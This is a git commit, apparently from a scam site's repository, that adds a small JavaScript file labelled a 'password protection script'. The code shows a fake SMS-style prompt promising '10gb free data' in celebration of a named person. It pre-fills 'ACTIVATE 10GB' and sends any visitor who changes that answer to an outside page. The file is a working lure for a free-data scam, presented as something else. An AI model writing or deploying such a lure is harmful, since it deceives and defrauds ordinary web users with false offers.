e396b5963376e959e4bf6e2ebb12e79f8c7c199f
itidnewblog1 <newblog1itid@gmail.com>
2025-12-14 12:27:45 +0100

    Create active-kenya.js

---
+++ active-kenya.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE 10GB'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive 10gb free data in celebration of Truphena Muthoni. Please press OK to get Data now.',
+  'ACTIVATE 10GB'
+);
+if (password != 'ACTIVATE 10GB') {
+  location.href = 'https://rhward.org/truphena.html';
+}
